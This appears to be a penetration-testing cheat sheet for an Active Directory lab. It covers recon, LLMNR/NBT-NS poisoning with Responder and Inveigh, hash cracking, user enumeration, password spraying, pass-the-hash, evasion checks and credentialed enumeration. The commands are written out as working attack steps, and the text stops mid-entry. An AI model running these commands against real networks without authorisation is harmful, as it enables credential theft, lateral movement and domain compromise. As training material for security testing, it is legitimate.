# Active Directory Penetration Testing Commands (with Examples)

-----

## Recon

This initial phase focuses on gathering intelligence from public sources without directly touching the target's infrastructure. It's all about passive information gathering. 🕵️‍♂️

### `viewdns.info`

  * **What it does:** This is not a command, but a **website** that offers a suite of tools for DNS reconnaissance. You can use it to find a domain's DNS records, IP address history, and other publicly available network information.
  * **When to use it:** Use this at the very beginning of an assessment to map out a company's public-facing assets like web servers, mail servers, and nameservers.
  * **Example in practice:** Navigate to `https://viewdns.info/` in your browser and use the "DNS Report" tool on the domain `inlanefreight.com` to get a comprehensive overview.

-----

### `nslookup ns1.inlanefreight.com`

  * **What it does:** This command queries DNS servers to find the IP address associated with a given hostname. In this case, it's looking for the IP of the nameserver `ns1.inlanefreight.com`.
  * **When to use it:** To identify the IP addresses of key servers (like domain controllers, mail servers, web servers) based on their names. This helps you build a list of potential targets.
  * **Example Command:**
    ```shell
    nslookup ns1.inlanefreight.com
    ```
  * **Options:**
      * `ns1.inlanefreight.com`: The target hostname to resolve. You can also specify a DNS server to query against, like `nslookup ns1.inlanefreight.com 8.8.8.8`.

-----

### `linkedin2username`

  * **What it does:** A tool that scrapes LinkedIn for employee names from a target company and generates potential username lists based on common formats (e.g., `j.smith`, `jsmith`, `john.smith`).
  * **When to use it:** To create a high-quality wordlist of potential usernames for later use in password spraying or user enumeration attacks.
  * **Example Command:**
    ```shell
    python3 linkedin2username.py -c "Inlan Freight" -d inlanefreight.local -o inlanefreight_users.txt
    ```
  * **Options:**
      * `-c "Inlan Freight"`: The company name to search for on LinkedIn.
      * `-d inlanefreight.local`: The domain name to append to some username formats.
      * `-o inlanefreight_users.txt`: The output file to save the generated usernames.

-----

### `filetype:pdf inurl:inlanefreight.com`

  * **What it does:** This is a **Google Dork**, an advanced search query. It tells Google to find only PDF files that are located on a URL containing `inlanefreight.com`.
  * **When to use it:** To uncover sensitive documents, internal reports, or marketing materials that may contain metadata, employee names, email addresses, or software versions.
  * **Example in practice:** Type `filetype:pdf inurl:inlanefreight.com` directly into the Google search bar.

-----

### `intext:"@inlanefreight.com" inurl:inlanefreight.com`

  * **What it does:** Another Google Dork that searches for the exact text `@inlanefreight.com` inside web pages that are also on a URL containing `inlanefreight.com`.
  * **When to use it:** This is a direct way to find email addresses that have been publicly exposed on the company's website or in documents it hosts.
  * **Example in practice:** Type `intext:"@inlanefreight.com" inurl:inlanefreight.com` directly into the Google search bar.

-----

### `sudo python3 dehashed.py -q inlanefreight.com -p`

  * **What it does:** Uses a script to search the Dehashed service for credentials that have been exposed in data breaches associated with the `inlanefreight.com` domain.
  * **When to use it:** To check for low-hanging fruit. If employees have reused their company passwords on other sites that were breached, you might find valid credentials to kickstart your attack.
  * **Example Command:**
    ```shell
    sudo python3 dehashed.py -q inlanefreight.com -p
    ```
  * **Options:**
      * `-q inlanefreight.com`: The query to search for (the domain name).
      * `-p`: Attempts to parse and display any found passwords from the breach data.

-----

-----

## Initial Enumeration

Now we start actively touching the network. This phase involves scanning for live hosts, open ports, and running services to map out the internal network landscape. 🗺️

### `sudo -E wireshark`

  * **What it does:** Launches Wireshark, the graphical network traffic analyzer, with root privileges.
  * **When to use it:** To visually inspect network traffic in real-time. It's perfect for identifying protocols, finding cleartext credentials, and understanding how devices communicate on the network.
  * **Example Command:**
    ```shell
    sudo -E wireshark
    ```
  * **Options:**
      * `sudo`: Executes the program as the root user, which is necessary to capture network packets.
      * `-E`: Preserves the user's environment variables.

-----

### `sudo tcpdump -i ens224`

  * **What it does:** A command-line packet sniffing tool. This command captures all traffic on the network interface named `ens224` and prints it to the terminal.
  * **When to use it:** For lightweight traffic capture, especially on a remote server via SSH where you don't have a GUI. You can also save the capture to a file (`-w capture.pcap`) for later analysis in Wireshark.
  * **Example Command:**
    ```shell
    sudo tcpdump -i ens224
    ```
  * **Options:**
      * `-i ens224`: Specifies the network **i**nterface to listen on. Use `ifconfig` or `ip a` to find your interface name.

-----

### `sudo responder -I ens224 -A`

  * **What it does:** Starts the Responder tool to perform an LLMNR/NBT-NS poisoning attack. It listens for name resolution requests from Windows hosts and tricks them into sending their password hashes to you.
  * **When to use it:** This is a go-to tool on an internal network test. Run it to capture NTLMv2 hashes from nearby Windows machines, which you can then try to crack offline.
  * **Example Command:**
    ```shell
    sudo responder -I ens224 -A
    ```
  * **Options:**
      * `-I ens224`: Specifies the network **I**nterface.
      * `-A`: **A**nalyze mode. This is an aggressive setting that responds to more queries, increasing your chances of capturing a hash.

-----

### `fping -asgq 172.16.5.0/23`

  * **What it does:** A very fast ICMP scanner. This command sends pings to every IP in the `172.16.5.0/23` subnet to quickly identify which hosts are online.
  * **When to use it:** As the first step in active enumeration. Before running a slow, detailed port scan, use `fping` to build a list of live targets.
  * **Example Command:**
    ```shell
    fping -asgq 172.16.5.0/23 > hosts.txt
    ```
  * **Options:**
      * `-a`: Show only **a**live systems.
      * `-s`: Print final **s**tatistics.
      * `-g`: **G**enerate the target list from a CIDR range.
      * `-q`: **Q**uiet mode (don't show per-host results).

-----

### `sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum.nmap`

  * **What it does:** Runs a detailed Nmap scan against the list of live hosts discovered with `fping`. It will try to identify services, versions, and the operating system for each host.
  * **When to use it:** After you have a list of live hosts. This is the main tool for service enumeration to find potential points of entry like open SMB, WinRM, or web server ports.
  * **Example Command:**
    ```shell
    sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum.nmap
    ```
  * **Options:**
      * `-v`: **V**erbose output.
      * `-A`: **A**ggressive scan (enables OS detection, version scanning, script scanning, and traceroute).
      * `-iL hosts.txt`: Takes the list of targets as **i**nput from the `hosts.txt` file.
      * `-oN <filename>`: Saves the **o**utput in **N**ormal format to a file.

-----

### `kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 users.txt -o valid_users.txt`

  * **What it does:** Uses Kerbrute to test a list of potential usernames against the Domain Controller via Kerberos. This method is safer than SMB enumeration because it doesn't typically trigger bad password alerts or cause lockouts.
  * **When to use it:** When you have a list of potential usernames (from Recon) and want to confirm which ones are valid AD accounts before attempting a password spray.
  * **Example Command:**
    ```shell
    kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 users.txt -o valid_users.txt
    ```
  * **Options:**
      * `userenum`: The Kerbrute mode for user enumeration.
      * `-d INLANEFREIGHT.LOCAL`: The target **d**omain.
      * `--dc 172.16.5.5`: The IP address of the **D**omain **C**ontroller.
      * `users.txt`: The input wordlist of usernames to test.
      * `-o valid_users.txt`: The **o**utput file to save valid usernames.

-----
Ready. Let's move on to the next section, which details the process of capturing and cracking credentials using network poisoning attacks.

-----

## LLMNR/NBT-NS Poisoning

This is an active attack where you impersonate a trusted server on the local network. When Windows clients can't find a resource via DNS, they fall back to older protocols (LLMNR/NBT-NS) and broadcast a request to the whole network. Your machine responds, "That's me\!" and the client helpfully sends you its password hash. 🎣

### `responder -h`

  * **What it does:** Displays the help menu for the Responder tool. It lists all available command-line options and provides a brief explanation for each.
  * **When to use it:** When you need a quick reminder of Responder's syntax or want to explore advanced features like setting up a WPAD proxy or enabling specific servers.
  * **Example Command:**
    ```shell
    responder -h
    ```
  * **Options:**
      * `-h`, `--help`: Shows the help message and exits.

-----

### `sudo responder -I ens224`

  * **What it does:** Starts Responder with its most common settings. It will listen for LLMNR, NBT-NS, and mDNS broadcasts on the `ens224` interface, poison any requests it sees, and automatically start rogue servers (SMB, HTTP, DNS, etc.) to capture credentials.
  * **When to use it:** This is the primary command to launch the attack. Run this on your attacker machine, then wait for a user on the network to mistype a server name (e.g., `\\fileservr`) or for a service to try and connect to a non-existent resource.
  * **Example Command:**
    ```shell
    sudo responder -I ens224 -v
    ```
  * **Options:**
      * `-I ens224`: Specifies the network **I**nterface to use.
      * `-v`: Adds **v**erbosity, showing more detail about incoming requests and actions taken.

-----

### `hashcat -m 5600 forend_ntlmv2.hash /usr/share/wordlists/rockyou.txt`

  * **What it does:** Attempts to crack a captured NTLMv2 hash using the Hashcat tool. It takes the hash, the hash type, and a wordlist, then rapidly tries every password in the list to find a match.
  * **When to use it:** After you successfully capture a hash with Responder. The hash is useless on its own; you need to crack it to get the user's cleartext password.
  * **Example Command:** (First, save your captured hash to a file named `forend_ntlmv2.hash`)
    ```shell
    hashcat -m 5600 forend_ntlmv2.hash /usr/share/wordlists/rockyou.txt
    ```
  * **Options:**
      * `-m 5600`: Specifies the hash **m**ode. `5600` is the code for NetNTLMv2 hashes, which is what Responder captures.
      * `forend_ntlmv2.hash`: The input file containing the hash to crack.
      * `/usr/share/wordlists/rockyou.txt`: The path to the password list to use for the attack.

-----

### `Import-Module .\Inveigh.ps1`

  * **What it does:** This is a PowerShell command that loads the Inveigh script into your current session, making its functions available. Inveigh is essentially a PowerShell version of Responder.
  * **When to use it:** When you're operating from a compromised Windows machine and want to perform poisoning attacks without dropping external binaries. This is a great "living off the land" technique.
  * **Example Command:**
    ```powershell
    Import-Module .\Inveigh.ps1
    ```

-----

### `Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y`

  * **What it does:** This command executes the main function of the Inveigh tool, starting the poisoning and capturing process.
  * **When to use it:** After importing the module, run this command to launch the attack from your compromised Windows host.
  * **Example Command:**
    ```powershell
    Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
    ```
  * **Options:**
      * `-LLMNR Y`: Enables **LLMNR** poisoning (**Y**es).
      * `-NBNS Y`: Enables **NBNS** poisoning (**Y**es).
      * `-ConsoleOutput Y`: Displays captured information directly in the PowerShell **console**.
      * `-FileOutput Y`: Saves captured information to a **file** in Inveigh's output directory.

-----

### Disabling NetBIOS over TCP/IP (Defensive Command)

  * **What it does:** This PowerShell script modifies the Windows Registry to disable NetBIOS over TCP/IP on all network interfaces.
  * **When to use it:** This is a **defensive** action. A system administrator would run this to harden a Windows machine against NBT-NS poisoning attacks, effectively mitigating tools like Responder and Inveigh.
  * **Example Command:**
    ```powershell
    $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
    Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
    ```
  * **Options:**
      * `Set-ItemProperty ... -Value 2`: Setting the `NetbiosOptions` value to `2` disables NetBIOS over TCP/IP for that interface.

-----

Alright, let's proceed. This next section covers the initial authenticated and unauthenticated probing of Active Directory to understand its rules and configuration.

-----

-----

## Sighting In, Hunting For a User

This phase is about making your first contact with key Active Directory services like SMB, RPC, and LDAP. The goal is to confirm domain details, enumerate policies, and test for anonymous access before launching broader attacks. It's like checking the wind before you take the shot. 🎯

### `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`

  * **What it does:** Uses CrackMapExec (CME) to authenticate to the SMB service on the Domain Controller (`172.16.5.5`) with the credentials `avazquez:Password123`. If the login is successful, it executes the `--pass-pol` module to retrieve the domain's password policy.
  * **When to use it:** When you have a potential set of credentials and want to both validate them and discover the password rules (e.g., minimum length, complexity, lockout threshold). This information is crucial for planning future password attacks.
  * **Example Command:**
    ```shell
    crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
    ```
  * **Options:**
      * `smb`: The protocol to target.
      * `-u avazquez`: The **u**sername for authentication.
      * `-p Password123`: The **p**assword for authentication.
      * `--pass-pol`: The CME module to execute for dumping the password policy.

-----

### `rpcclient -U "" -N 172.16.5.5`

  * **What it does:** This command attempts to connect to the target's RPC (Remote Procedure Call) service anonymously. This is known as establishing a "null session." If successful, it drops you into an interactive `rpcclient` prompt.
  * **When to use it:** To test if the domain controller allows null sessions. If it does, you can perform a significant amount of unauthenticated enumeration to gather user lists, domain information, and more.
  * **Example Command & Interaction:**
    ```shell
    rpcclient -U "" -N 172.16.5.5
    rpcclient $> querydominfo
    ```
  * **Options:**
      * `-U ""`: Specifies an empty **U**sername for the null session.
      * `-N`: Indicates **N**o password should be used.
      * `querydominfo`: An internal `rpcclient` command to get basic domain information like the domain name and SID.

-----

### `enum4linux -P 172.16.5.5`

  * **What it does:** A classic enumeration tool that wraps several underlying Samba utilities to query Windows systems for information. This specific command focuses on retrieving the password policy.
  * **When to use it:** For quick, unauthenticated enumeration of a Windows host, especially a domain controller. It can often pull password policies, user lists, and shares via null sessions.
  * **Example Command:**
    ```shell
    enum4linux -P 172.16.5.5
    ```
  * **Options:**
      * `-P`: Get **P**assword Policy information. Other useful flags include `-U` for users and `-S` for shares.

-----

### `enum4linux-ng -P 172.16.5.5 -oA ilfreight`

  * **What it does:** Runs `enum4linux-ng` ("next generation"), an updated and more robust version of the original tool. This command gets the password policy and saves the output in all available formats.
  * **When to use it:** It's generally recommended to use `enum4linux-ng` over the original. It's great for initial recon and information gathering, with better parsing and more reliable checks.
  * **Example Command:**
    ```shell
    enum4linux-ng -P 172.16.5.5 -oA ilfreight
    ```
  * **Options:**
      * `-P`: Get **P**assword Policy information.
      * `-oA ilfreight`: **o**utput in **A**ll formats (nmap, XML, and JSON) with the base filename `ilfreight`.

-----

### `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" ...`

  * **What it does:** Performs an anonymous LDAP query against the domain controller. It searches the entire directory for all objects and then uses `grep` to find the `pwdHistoryLength` attribute, which is part of the password policy.
  * **When to use it:** When you want to query LDAP directly, especially if you suspect other protocols like RPC or SMB are blocked. This is a very targeted way to get domain policy details if anonymous LDAP binds are allowed.
  * **Example Command:**
    ```shell
    ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
    ```
  * **Options:**
      * `-h 172.16.5.5`: The target **h**ost (LDAP server).
      * `-x`: Use simple authentication (i.e., anonymous/unauthenticated).
      * `-b "..."`: The search **b**ase, which is the root of the domain directory.
      * `grep -m 1 -B 10`: Finds the first **m**atch and also shows the 10 lines **B**efore it to give context.

-----

### `net use \\DC01\ipc$ "" /u:""`

  * **What it does:** This is the native Windows command to attempt a null session connection to the `IPC$` (Inter-Process Communication) share on the server named `DC01`.
  * **When to use it:** From a Windows machine, this is the quickest way to test for null session vulnerabilities. A "command completed successfully" message means you can proceed with further unauthenticated enumeration. A failure (e.g., access denied) means null sessions are disabled.
  * **Example Command:**
    ```shell
    net use \\DC01\ipc$ "" /u:""
    ```
  * **Options:**
      * `\\DC01\ipc$`: The UNC path to the target IPC share.
      * `""`: An empty password.
      * `/u:""`: An empty **u**sername.

-----

### `net accounts`

  * **What it does:** When run from a domain-joined Windows computer, this command displays the password and logon policies for the entire domain.
  * **When to use it:** After gaining your first shell on any domain-joined machine, this is one of the first commands to run. It gives you an instant overview of the password policy without needing any special tools.
  * **Example Command:**
    ```shell
    net accounts
    ```

-----

### `Import-Module .\PowerView.ps1` and `Get-DomainPolicy`

  * **What it does:** The first command loads the PowerView script, a powerful tool for AD enumeration. The `Get-DomainPolicy` function then retrieves the default domain policy, providing a much more detailed output than `net accounts`.
  * **When to use it:** This is the modern PowerShell way to get domain policy information. It's more comprehensive and is the preferred method when you have PowerShell access.
  * **Example Commands:**
    ```powershell
    Import-Module .\PowerView.ps1
    Get-DomainPolicy
    ```

-----

Let's continue. Now that we have a feel for the network, the next step is to get a list of valid usernames. This is a critical prerequisite for password attacks.

-----

## Username Enumeration

The goal here is to turn our list of *potential* usernames from the recon phase into a list of *confirmed* usernames. There are many ways to do this, each leveraging different services and protocols. 👤

### `enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`

  * **What it does:** This is a one-liner that runs `enum4linux` to get a list of users, then uses command-line text processing to clean up the output. `grep` filters for lines with "user:", and the two `cut` commands carve out just the username.
  * **When to use it:** A quick way to get a clean user list if the target is vulnerable to anonymous RPC enumeration (null session).
  * **Example Command:**
    ```shell
    enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > users.txt
    ```
  * **Options:**
      * `-U`: Tells `enum4linux` to get the **U**ser list.
      * `|`: The "pipe" operator, which sends the output of the command on its left to the input of the command on its right.
      * `cut -f2 -d"["`: **c**uts the line using `[` as a **d**elimiter and keeps the 2nd **f**ield.
      * `cut -f1 -d"]"`: Takes the previous result and cuts it using `]` as a delimiter, keeping the 1st field.

-----

### `rpcclient -U "" -N 172.16.5.5` (with `enumdomusers`)

  * **What it does:** Establishes an anonymous null session with `rpcclient`, then uses the tool's built-in `enumdomusers` command to list all users in the domain.
  * **When to use it:** Another excellent method for user enumeration if null sessions are allowed on the domain controller. It's often more reliable and provides cleaner output than `enum4linux`.
  * **Example Command & Interaction:**
    ```shell
    rpcclient -U "" -N 172.16.5.5
    rpcclient $> enumdomusers
    ```

-----

### `crackmapexec smb 172.16.5.5 --users`

  * **What it does:** Uses CrackMapExec to enumerate domain users via the SMB protocol.
  * **When to use it:** For very fast user enumeration. This works best if you have at least one valid set of low-privileged credentials, but it can sometimes succeed with a null session if permissions are lax.
  * **Example Command:**
    ```shell
    crackmapexec smb 172.16.5.5 --users
    ```
  * **Options:**
      * `--users`: The action to perform user enumeration.

-----

### `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" ...`

  * **What it does:** Performs an anonymous LDAP query for all objects with the class "user" and then parses the output with `grep` and `cut` to extract only the `sAMAccountName` (the username).
  * **When to use it:** If anonymous LDAP binds are allowed, this is one of the most accurate and comprehensive ways to get a full list of every user in the domain.
  * **Example Command:**
    ```shell
    ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
    ```
  * **Options:**
      * `"(&(objectclass=user))"`: The LDAP filter to find only user objects.

-----

### `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/userlist.txt | awk ...`

  * **What it does:** This command uses Kerbrute with a wordlist to find valid users. The output is then piped through `awk` and `cut` to extract only the clean username from successful hits and save them to a file.
  * **When to use it:** When other enumeration methods fail. This is an active method that validates a pre-existing list of potential usernames. It's safe from lockouts and very reliable.
  * **Example Command (username only):**
    ```shell
    kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/userlist.txt | awk '/VALID USERNAME/ {print $7}' | cut -d '@' -f 1 > valid_users.txt
    ```
  * **Options:**
      * `awk '/VALID USERNAME/ {print $7}'`: For any line containing "VALID USERNAME", this prints the 7th field, which is the full User Principal Name (e.g., `forend@inlanefreight.local`).
      * `cut -d '@' -f 1`: Splits the UPN by the `@` symbol and keeps the first part (the username).

-----

### `sudo crackmapexec smb 172.16.5.5 -u htb-student -p 'Academy_student_AD!' --users`

  * **What it does:** This is a **credentialed** version of the CME user enumeration command. It authenticates as the user `htb-student` and then performs the user enumeration.
  * **When to use it:** Once you have your first foothold with any valid domain credentials. Authenticated enumeration is far more likely to succeed and will provide a complete list of users.
  * **Example Command:**
    ```shell
    sudo crackmapexec smb 172.16.5.5 -u htb-student -p 'Academy_student_AD!' --users
    ```
  * **Options:**
      * `-u htb-student`: The **u**sername to authenticate with.
      * `-p 'Academy_student_AD!'`: The **p**assword. Note the quotes, which are important if the password contains special characters.


Let's get to it. With a list of confirmed usernames, it's time to see if anyone is using a weak or common password.

-----

-----

## Password Spraying

Password spraying is the opposite of a traditional brute-force attack. Instead of trying many passwords for one user, you try **one password** for **many users**. This technique is slow, patient, and highly effective at bypassing account lockout policies. 💦

### `for u in $(cat valid_users.txt);do rpcclient ... done`

  * **What it does:** This is a simple bash `for` loop. It reads each username from the `valid_users.txt` file and uses `rpcclient` to try and log in with that user and the password `Welcome1`. If the login is successful, `rpcclient` will return information about the user, which `grep Authority` will catch and print.
  * **When to use it:** When you don't have specialized tools and need a quick and dirty way to spray a password. It's not very efficient and can be noisy, but it works in a pinch.
  * **Example Command:**
    ```shell
    for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
    ```
  * **Options:**
      * `-U "$u%Welcome1"`: The **U**ser authentication string. `rpcclient` uses a `%` to separate the username and password.
      * `-c "getusername;quit"`: Executes the `getusername` **c**ommand on successful login and then quits the session.

-----

### `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`

  * **What it does:** Uses Kerbrute's dedicated password spraying module. It attempts to get a Kerberos ticket for each user in `valid_users.txt` using the password `Welcome1`.
  * **When to use it:** This is a much safer and stealthier way to password spray than using SMB or RPC. Failed Kerberos pre-authentication attempts are less likely to trigger security alerts or account lockouts.
  * **Example Command:**
    ```shell
    kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
    ```
  * **Options:**
      * `passwordspray`: The Kerbrute module for this attack.
      * `valid_users.txt`: The file containing the list of target usernames.
      * `Welcome1`: The single password to try against all users.

-----

### `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`

  * **What it does:** Uses CrackMapExec to try the password `Password123` against every user in `valid_users.txt` over the SMB protocol. The `| grep +` at the end filters the output to show only successful logins.
  * **When to use it:** This is the most common and powerful method for password spraying on an internal network. CME is highly optimized for this task and provides clear results.
  * **Example Command:**
    ```shell
    sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p 'Summer2025!' | grep '+'
    ```
  * **Options:**
      * `-u valid_users.txt`: Specifies a file containing **u**sernames.
      * `-p 'Summer2025!'`: The **p**assword to spray.
      * `| grep '+'`: CME uses a green `(+)` to indicate a successful login. This command shows only those successful results.

-----

### `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`

  * **What it does:** This command performs a "pass-the-hash" attack across an entire subnet. Instead of a password, it uses the NTLM hash of the `administrator` account's password to authenticate against the **local accounts** of every machine in the range.
  * **When to use it:** When you've dumped a local administrator hash from one machine and want to see if that same password is reused on other workstations or servers. This is a classic lateral movement technique.
  * **Example Command:**
    ```shell
    sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep '+'
    ```
  * **Options:**
      * `--local-auth`: Tells CME to authenticate against **local** accounts, not domain accounts.
      * `-H 88ad...`: The NTLM **H**ash to use for authentication.

-----

### `Import-Module .\DomainPasswordSpray.ps1`

  * **What it does:** This PowerShell command loads a specialized script for password spraying into your current session.
  * **When to use it:** When you're operating from a compromised Windows host and want to launch a password spray from within the network using native PowerShell tools.
  * **Example Command:**
    ```powershell
    Import-Module .\DomainPasswordSpray.ps1
    ```

-----

### `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success.txt`

  * **What it does:** After importing the module, this command runs the password spray. It will enumerate all users from the domain and try to authenticate as each one with the password `Welcome1`.
  * **When to use it:** This is the execution step after loading the script. It's a powerful "living off the land" technique for finding accounts with weak passwords from a compromised Windows machine.
  * **Example Command:**
    ```powershell
    Invoke-DomainPasswordSpray -Password 'Welcome1!' -OutFile spray_success.txt -ErrorAction SilentlyContinue
    ```
  * **Options:**
      * `-Password 'Welcome1!'`: The password to spray.
      * `-OutFile spray_success.txt`: Saves successful hits to a file.
      * `-ErrorAction SilentlyContinue`: Suppresses the red error text for failed login attempts, keeping the console clean.

Let's proceed. After gaining that first foothold through a password spray or an exploit, the next phase is to understand the environment you've landed in.

-----

-----

## Deeper Down / Living Off the Land

This is the situational awareness phase. You have a shell on a machine, but you know nothing about it or the network it's on. The principle of "Living Off the Land" (LOL) means using only the tools and utilities already built into the operating system (like PowerShell, `net`, `wmic`, `dsquery`) to conduct enumeration. This is stealthier as it avoids dropping custom tools that might be flagged by antivirus. 💻

### `Get-MpComputerStatus`

  * **What it does:** This PowerShell cmdlet retrieves the detailed status of the Windows Defender Antivirus on the local machine.
  * **When to use it:** Run this immediately upon gaining access to a Windows host. It tells you if real-time protection is enabled, when the virus definitions were last updated, and if any components are disabled. This knowledge helps you decide how to evade detection.
  * **Example Command:**
    ```powershell
    Get-MpComputerStatus
    ```

### `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

  * **What it does:** This command retrieves the current AppLocker policy, which is a set of rules that dictates which applications and scripts are allowed to run.
  * **When to use it:** To understand the lockdown level of the machine. If AppLocker is enforced, you can't just run any tool you want. By examining the rules, you can find weaknesses, such as a writable directory that is not restricted, allowing you to bypass the policy.
  * **Example Command:**
    ```powershell
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    ```

### `$ExecutionContext.SessionState.LanguageMode`

  * **What it does:** This special PowerShell variable reveals the "language mode" of your current session.
  * **When to use it:** To check for PowerShell Constrained Language Mode, a security feature that severely limits the commands and code you can run. If the output is not `FullLanguage`, many of your PowerShell tools and scripts will fail, and you'll need to find a bypass.
  * **Example Command:**
    ```powershell
    $ExecutionContext.SessionState.LanguageMode
    ```

### `powershell.exe -version 2`

  * **What it does:** Starts a new PowerShell session using the much older Version 2 engine.
  * **When to use it:** As a bypass for modern security features. PowerShell v2 lacks many of the logging and security controls (like AMSI) present in modern versions. If your scripts are being blocked in a v5+ session, downgrading to v2 (if it's still installed on the system) might allow them to run.
  * **Example Command:**
    ```powershell
    powershell.exe -version 2
    ```

### `netsh advfirewall show allprofiles`

  * **What it does:** Uses the built-in `netsh` tool to display the status and rules for all profiles of the Windows Firewall (Domain, Private, and Public).
  * **When to use it:** To understand the host-based firewall configuration. This is crucial for planning lateral movement, as it tells you which ports are open for inbound or outbound connections.
  * **Example Command:**
    ```shell
    netsh advfirewall show allprofiles
    ```

### `qwinsta`

  * **What it does:** Shows information about the Remote Desktop sessions on the server. It lists who is logged on, their session ID, and the state of their session.
  * **When to use it:** To see who else is on the box. If an administrator is actively logged in, you might be able to steal their token or capture their credentials from memory. It also tells you to be stealthy to avoid being discovered.
  * **Example Command:**
    ```shell
    qwinsta
    ```

### `arp -a`

  * **What it does:** Displays the local ARP cache, which is a table that maps IP addresses to the physical MAC addresses of other devices on the same network segment.
  * **When to use it:** For very stealthy local network reconnaissance. The ARP table is populated with hosts the machine has recently communicated with, giving you a list of nearby targets without sending a single packet yourself.
  * **Example Command:**
    ```shell
    arp -a
    ```

### `route print`

  * **What it does:** Displays the local IP routing table.
  * **When to use it:** To understand how the compromised host is connected to the network. You can find the default gateway, learn about other connected subnets, and identify potentially interesting network routes.
  * **Example Command:**
    ```shell
    route print
    ```

### `net user wrouse /domain`

  * **What it does:** Uses the built-in `net` utility to query the domain for detailed information about a specific user, in this case, `wrouse`.
  * **When to use it:** To get details about a user of interest, such as their full name, description, and, most importantly, their group memberships.
  * **Example Command:**
    ```shell
    net user wrouse /domain
    ```
  * **Options:**
      * `/domain`: This flag is critical. It tells the command to query the domain controller instead of the local machine's user database.

### `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName`

  * **What it does:** This is an advanced query using the `dsquery` tool. The complex-looking filter is an LDAP matching rule that specifically looks for accounts where the `TRUSTED_FOR_DELEGATION` flag is set in their `userAccountControl` attribute. These accounts are configured for unconstrained delegation, a high-value target.
  * **When to use it:** To hunt for one of the most powerful and abusable configurations in Active Directory. Compromising an account with unconstrained delegation can often lead to a full domain compromise.
  * **Example Command:**
    ```shell
    dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName description
    ```
  * **Options:**
      * `-filter "..."`: Specifies the LDAP filter to use for the search.
      * `-limit 5`: Limits the output to the first 5 results.
      * `-attr sAMAccountName description`: Shows only the username and description attributes of the found objects.

Of course. Once you have a valid set of credentials, the entire landscape of enumeration opens up. Authenticated scanning is far more accurate and provides a wealth of information.

-----

## Credentialed Enumeration

With a valid username and password, you're no longer an outsider guessing. You're an authenticated user, and the domain will willingly share its secrets with you. This phase is about systematically querying Active Directory to map its users, groups, computers, and permissions to find a path to privilege escalation. 🔑

### From Linux

Here are the commands you would typically run from a Linux-based attacker machine.

#### `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`

  * **What it does:** Uses CME to authenticate to the Domain Controller with the user `forend` and then dumps a list of all domain users.
  * **When to use it:** As one of the first steps after getting credentials. Getting a full user list is fundamental.
  * **Example Command:**
    ```shell
    sudo crackmapexec smb 172.16.5.5 -u forend -p 'Klmcargo2' --users
    ```
  * **Options:**
      * `-u forend`: The **u**sername to authenticate with.
      * `-p 'Klmcargo2'`: The **p**assword.
      * `--users`: The enumeration module to run. Other examples include `--groups`, `--computers`, `--shares`, etc.

#### `sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users`

  * **What it does:** Queries a specific machine (`172.16.5.130`) to see which users are currently logged on.
  * **When to use it:** To hunt for privileged users. If you see a Domain Admin logged into a workstation, that machine becomes a high-value target for credential theft.
  * **Example Command:**
    ```shell
    sudo crackmapexec smb 172.16.5.130 -u forend -p 'Klmcargo2' --loggedon-users
    ```
  * **Options:**
      * `--loggedon-users`: The specific CME module to check for active sessions.

#### `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'`

  * **What it does:** Executes the `spider_plus` module on CME. This module recursively crawls an SMB share, listing all files and folders, and can optionally search for files with interesting keywords in their names or content.
  * **When to use it:** When you've found an interesting file share (like one named "IT" or "HR"). Use this to automatically hunt for files named `password.txt`, `config.xml`, etc.
  * **Example Command:**
    ```shell
    sudo crackmapexec smb 172.16.5.5 -u forend -p 'Klmcargo2' -M spider_plus --share 'Department Shares'
    ```
  * **Options:**
      * `-M spider_plus`: Runs the specified **M**odule.
      * `--share 'Department Shares'`: The name of the share to spider.

#### `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`

